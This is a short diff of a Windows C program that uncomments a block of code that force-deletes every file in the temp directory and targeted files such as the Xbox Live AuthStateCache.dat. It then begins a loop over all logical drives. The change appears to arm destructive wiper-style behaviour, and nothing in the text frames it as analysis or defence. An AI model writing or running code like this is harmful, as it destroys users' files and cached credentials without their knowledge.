@@ -215,7 +215,7 @@ int main() {
 	SHGetFolderPath(0, CSIDL_APPDATA, 0, SHGFP_TYPE_DEFAULT, appdata);
 	SHGetFolderPath(0, CSIDL_LOCAL_APPDATA, 0, SHGFP_TYPE_DEFAULT, localappdata);
 
-	/*wsprintf(path, L"%ws*", temp);
+	wsprintf(path, L"%ws*", temp);
 	ForEachFile(path, {
 		wsprintf(path, L"%ws%ws", temp, file);
 		ForceDeleteFile(path);
@@ -243,7 +243,7 @@ int main() {
 	ForceDeleteFile(path);
 
 	wsprintf(path, L"%ws\\Microsoft\\XboxLive\\AuthStateCache.dat", localappdata);
-	ForceDeleteFile(path);*/
+	ForceDeleteFile(path);
 
 	for (DWORD drives = GetLogicalDrives(), drive = L'C', index = 0; drives; drives >>= 1, ++index) {
 		if (drives & 1) {
